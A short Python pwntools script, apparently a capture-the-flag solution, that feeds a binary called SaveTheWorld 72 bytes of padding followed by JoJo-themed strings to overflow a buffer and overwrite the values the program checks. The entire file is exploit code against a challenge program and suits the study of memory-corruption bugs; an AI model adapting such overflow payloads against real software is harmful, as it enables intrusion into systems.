from pwn import * 

msg = b"a"*(72) +b"Jotaro!!"+b"Star Platinum!!!"+b"HORA"+b"9999" 
p = process('./SaveTheWorld') 
p.sendline(msg) 
msgout = p.recvall() 
print('output:\t', msgout) 